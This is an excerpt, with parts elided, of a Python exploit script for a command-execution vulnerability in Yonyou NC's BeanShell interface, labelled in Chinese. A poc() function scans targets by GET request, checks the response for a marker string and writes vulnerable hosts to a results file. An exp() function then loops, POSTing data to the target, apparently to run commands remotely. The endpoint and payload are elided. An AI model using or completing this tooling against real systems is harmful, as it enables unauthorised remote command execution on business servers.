...
def banner():
    text ="""用友NC BeanShell命令执行漏洞"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友NC BeanShell命令执行漏洞")
...
def poc(target):
    ...
    try:
        res1 = requests.get(url=target+api,headers=headers,verify=False,timeout=10)
        if res1.status_code == 200:
            ...
            if 'SIS2405' in content[0]:
                print(f"{target}存在漏洞")
                with open('yongyou_result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
                    return True
            else:
...
def exp(target):
    ...
    while True:
        ...
        res1 = requests.post(url=target+api,headers=headers,data=data,verify=False,timeout=10)
